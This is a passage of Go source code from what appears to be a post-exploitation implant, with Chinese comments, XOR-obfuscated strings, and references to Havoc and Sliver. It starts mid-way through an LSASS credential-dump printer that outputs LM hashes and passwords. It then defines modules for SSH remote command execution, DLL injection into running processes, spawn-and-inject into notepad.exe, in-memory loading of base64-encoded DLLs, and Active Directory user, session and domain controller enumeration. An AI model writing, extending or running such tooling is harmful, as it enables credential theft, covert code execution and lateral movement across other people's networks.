					sb.WriteString(fmt.Sprintf("  LM Hash:     %s\n", cred.LMHash))
				}
				if cred.Password != "" {
					sb.WriteString(fmt.Sprintf("  Password:    %s\n", cred.Password))
				}
				sb.WriteString(fmt.Sprintf("  Source:      %s\n\n", cred.SourceType))
			}
			return sb.String(), "", 0
		}
		return xorDecode(strBOFFailNoCreds), "", 0
	}

	// 默认：BOF 失败时返回错误信息
	if result.Error != "" {
		return "", fmt.Sprintf(xorDecode(strBOFFailFallback), result.Error), 1
	}
	return xorDecode(strNoCredsLSASS), "", 0
}

// SSHExecModule SSH远程命令执行。
// Usage: ssh_exec <host> <port> <user> <auth> <command>
//   auth: 密码 或 key_path (以 / 或 . 开头时视为密钥路径，否则为密码)
func SSHExecModule(args string) (string, string, int) {
	fields := strings.Fields(args)
	if len(fields) < 5 {
		return "", "usage: ssh_exec <host> <port> <user> <auth> <command>\n  auth: password or /path/to/private_key", 1
	}
	host := fields[0]
	port := fields[1]
	user := fields[2]
	auth := fields[3]
	command := strings.Join(fields[4:], " ")

	var password, keyPath string
	if strings.HasPrefix(auth, "/") || strings.HasPrefix(auth, ".") {
		keyPath = auth
	} else {
		password = auth
	}

	stdout, stderr, exitCode, err := lateral.SSHExec(host, port, user, password, keyPath, command)
	if err != nil {
		return "", err.Error(), 1
	}
	var sb strings.Builder
	if stdout != "" {
		sb.WriteString(stdout)
	}
	if stderr != "" {
		if sb.Len() > 0 {
			sb.WriteString("\n")
		}
		sb.WriteString(stderr)
	}
	return sb.String(), "", exitCode
}

// DLLInjectModule DLL注入到已有进程。
// Usage: dll_inject <pid> <dll_path> [loadlibrary|reflect]
func DLLInjectModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "DLL injection only available on Windows", 1
	}
	fields := strings.Fields(args)
	if len(fields) < 2 {
		return "", "usage: dll_inject <pid> <dll_path> [loadlibrary|reflect]", 1
	}
	var pid uint32
	fmt.Sscanf(fields[0], "%d", &pid)
	dllPath := fields[1]
	method := "loadlibrary"
	if len(fields) > 2 {
		method = fields[2]
	}

	var data []byte
	if method == "reflect" {
		var err error
		data, err = os.ReadFile(dllPath)
		if err != nil {
			return "", fmt.Sprintf("read DLL: %v", err), 1
		}
	}

	result := modmgr.InjectDLL(&modmgr.DLLConfig{
		PID:     pid,
		DLLPath: dllPath,
		DLLData: data,
		Method:  method,
	})
	if !result.Success {
		return "", result.Message, 1
	}
	return result.Message, "", 0
}

// DLLSpawnModule 创建新进程并注入 DLL。
// Usage: dll_spawn <dll_path> [spawn_path] [args]
func DLLSpawnModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "DLL spawn only available on Windows", 1
	}
	fields := strings.Fields(args)
	if len(fields) < 1 {
		return "", "usage: dll_spawn <dll_path> [spawn_path] [args...]", 1
	}
	dllPath := fields[0]
	spawnPath := "C:\\Windows\\System32\\notepad.exe"
	cmdArgs := ""
	if len(fields) > 1 {
		spawnPath = fields[1]
	}
	if len(fields) > 2 {
		cmdArgs = strings.Join(fields[2:], " ")
	}

	data, err := os.ReadFile(dllPath)
	if err != nil {
		return "", fmt.Sprintf("read DLL: %v", err), 1
	}

	result := modmgr.InjectDLL(&modmgr.DLLConfig{
		DLLPath:   dllPath,
		DLLData:   data,
		Method:    "spawn",
		SpawnPath: spawnPath,
		Args:      cmdArgs,
	})
	if !result.Success {
		return "", result.Message, 1
	}
	return result.Message, "", 0
}

// NetEnumModule 原生网络/AD 枚举。
// 参考 Havoc 的 CommandNet。
func NetEnumModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "network enumeration only available on Windows", 1
	}
	fields := strings.Fields(args)
	if len(fields) < 1 {
		return netUsage(), "", 1
	}

	target := ""
	if len(fields) > 1 {
		target = fields[1]
	}

	var sb strings.Builder
	var err error

	switch fields[0] {
	case "share":
		if target == "" {
			target = "\\\\."
		}
		shares, e := netenum.EnumShares(target)
		err = e
		if err == nil {
			sb.WriteString(fmt.Sprintf("%-20s %-8s %s\n", "NAME", "TYPE", "REMARK"))
			sb.WriteString(strings.Repeat("-", 60) + "\n")
			for _, s := range shares {
				sb.WriteString(fmt.Sprintf("%-20s %-8s %s\n", s.Name, shareTypeStr(s.Type), s.Remark))
			}
		}
	case "user":
		if target == "" {
			target = "\\\\."
		}
		users, e := netenum.EnumUsers(target)
		err = e
		if err == nil {
			sb.WriteString(fmt.Sprintf("%-24s %-30s %s\n", "NAME", "FULL NAME", "COMMENT"))
			sb.WriteString(strings.Repeat("-", 80) + "\n")
			for _, u := range users {
				sb.WriteString(fmt.Sprintf("%-24s %-30s %s\n", u.Name, u.FullName, u.Comment))
			}
		}
	case "group":
		if target == "" {
			target = "\\\\."
		}
		groups, e := netenum.EnumGroups(target)
		err = e
		if err == nil {
			sb.WriteString(fmt.Sprintf("%-24s %s\n", "NAME", "COMMENT"))
			sb.WriteString(strings.Repeat("-", 60) + "\n")
			for _, g := range groups {
				sb.WriteString(fmt.Sprintf("%-24s %s\n", g.Name, g.Comment))
			}
		}
	case "group_members":
		if len(fields) < 2 {
			return "", "usage: net group_members <group> [target]", 1
		}
		tgt := "\\\\."
		if len(fields) > 2 {
			tgt = fields[2]
		}
		members, e := netenum.EnumGroupMembers(tgt, fields[1])
		err = e
		if err == nil {
			sb.WriteString(fmt.Sprintf("Members of '%s':\n", fields[1]))
			for _, m := range members {
				sb.WriteString(fmt.Sprintf("  %s\n", m))
			}
		}
	case "sessions":
		if target == "" {
			target = "\\\\."
		}
		sessions, e := netenum.EnumSessions(target)
		err = e
		if err == nil {
			sb.WriteString(fmt.Sprintf("%-30s %-20s %-10s %-10s\n", "CLIENT", "USER", "TIME(s)", "IDLE(s)"))
			sb.WriteString(strings.Repeat("-", 75) + "\n")
			for _, s := range sessions {
				sb.WriteString(fmt.Sprintf("%-30s %-20s %-10d %-10d\n", s.Client, s.User, s.Time, s.Idle))
			}
		}
	case "logons":
		if target == "" {
			target = "\\\\."
		}
		users, e := netenum.EnumLoggedOn(target)
		err = e
		if err == nil {
			sb.WriteString(fmt.Sprintf("%-24s %-20s %s\n", "USERNAME", "DOMAIN", "LOGON SERVER"))
			sb.WriteString(strings.Repeat("-", 70) + "\n")
			for _, u := range users {
				sb.WriteString(fmt.Sprintf("%-24s %-20s %s\n", u.UserName, u.Domain, u.LogonSrv))
			}
		}
	case "computers":
		domain := ""
		if len(fields) > 1 {
			domain = fields[1]
		}
		computers, e := netenum.EnumComputers(domain)
		err = e
		if err == nil {
			sb.WriteString(fmt.Sprintf("%-30s %s\n", "NAME", "DOMAIN"))
			sb.WriteString(strings.Repeat("-", 50) + "\n")
			for _, c := range computers {
				sb.WriteString(fmt.Sprintf("%-30s %s\n", c.Name, c.Domain))
			}
		}
	case "dc":
		dc, e := netenum.FindDomainController()
		err = e
		if err == nil {
			sb.WriteString(fmt.Sprintf("Domain Controller: %s\n", dc))
		}
	default:
		return netUsage(), "", 1
	}

	if err != nil {
		return "", err.Error(), 1
	}
	return sb.String(), "", 0
}

func netUsage() string {
	return `Usage: net <subcommand> [target]
  share [target]          Enumerate SMB shares
  user [target]           Enumerate users
  group [target]          Enumerate local groups
  group_members <group>   Enumerate group members
  sessions [target]       Enumerate active sessions
  logons [target]         Enumerate logged-on users
  computers [domain]      Enumerate domain computers
  dc                      Find domain controller

  target: \\\\server or \\\\. (local)`
}

func shareTypeStr(t uint32) string {
	switch t {
	case 0:
		return "Disk"
	case 1:
		return "Print"
	case 2:
		return "Device"
	case 3:
		return "IPC"
	case 2147483648:
		return "Special"
	default:
		return fmt.Sprintf("0x%x", t)
	}
}

// extensions tracks loaded in-memory DLL extensions (Sliver-style).
var extensions = make(map[string]*extexec.Extension)
var extensionsMu sync.Mutex

// ExtensionModule handles in-memory DLL loading and export execution.
// Sliver-style: load DLL entirely in memory via memmod, call exports with callback-based return.
// Usage:
//
//	extension load <id> <base64_dll>          — load DLL into memory
//	extension call <id> <export> [base64_args] — call an export function
//	extension unload <id>                     — unload and free memory
//	extension list                            — list loaded extensions
func ExtensionModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "extension loading only available on Windows", 1
	}
	fields := strings.Fields(args)
	if len(fields) < 1 {
		return "usage: extension <load|call|unload|list> [args...]", "", 1
	}

	switch fields[0] {
	case "load":
		if len(fields) < 3 {
			return "", "usage: extension load <id> <base64_dll>", 1
		}
		id := fields[1]
		data, err := base64.StdEncoding.DecodeString(fields[2])
		if err != nil {
			return "", fmt.Sprintf("base64 decode: %v", err), 1
		}

		ext, err := extexec.Load(data, id)
		if err != nil {
			return "", fmt.Sprintf("load extension: %v", err), 1
		}

		extensionsMu.Lock()
		extensions[id] = ext
		extensionsMu.Unlock()

		return fmt.Sprintf("extension loaded: id=%s", id), "", 0

	case "call":
		if len(fields) < 3 {
			return "", "usage: extension call <id> <export> [base64_args]", 1
		}
		id := fields[1]
		export := fields[2]
		var extArgs []byte
		if len(fields) > 3 {
			var err error
			extArgs, err = base64.StdEncoding.DecodeString(fields[3])
			if err != nil {
				return "", fmt.Sprintf("base64 decode args: %v", err), 1
			}
		}

		extensionsMu.Lock()
		ext, ok := extensions[id]
		extensionsMu.Unlock()
		if !ok {
			return fmt.Sprintf("extension not found: %s", id), "", 1
		}

		var result []byte
		var resultMu sync.Mutex
		err := ext.Call(export, extArgs, func(data []byte) {
			resultMu.Lock()
			result = make([]byte, len(data))
			copy(result, data)
			resultMu.Unlock()
		})
		if err != nil {
			return "", fmt.Sprintf("call %s.%s: %v", id, export, err), 1
		}

		resultMu.Lock()
		out := string(result)
		resultMu.Unlock()
		if len(result) > 0 {
			return fmt.Sprintf("extension %s.%s returned: %s", id, export, out), "", 0
		}
		return fmt.Sprintf("extension %s.%s executed successfully", id, export), "", 0

	case "unload":
		if len(fields) < 2 {
			return "", "usage: extension unload <id>", 1
		}
		id := fields[1]

		extensionsMu.Lock()
		ext, ok := extensions[id]
		if ok {
			delete(extensions, id)
		}
		extensionsMu.Unlock()

		if !ok {
			return fmt.Sprintf("extension not found: %s", id), "", 1
		}
		if err := ext.Unload(); err != nil {
			return "", fmt.Sprintf("unload: %v", err), 1
		}
		return fmt.Sprintf("extension unloaded: %s", id), "", 0

	case "list":
		extensionsMu.Lock()
		count := len(extensions)
		ids := make([]string, 0, count)
		for id := range extensions {
			ids = append(ids, id)
		}
		extensionsMu.Unlock()

		if count == 0 {
			return "no extensions loaded", "", 0
		}
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("%-20s\n", "ID"))
		sb.WriteString(strings.Repeat("-", 22) + "\n")
		for _, id := range ids {
			sb.WriteString(fmt.Sprintf("%-20s\n", id))
		}
		return sb.String(), "", 0

	default:
		return fmt.Sprintf("unknown subcommand: %s", fields[0]), "", 1
	}
}
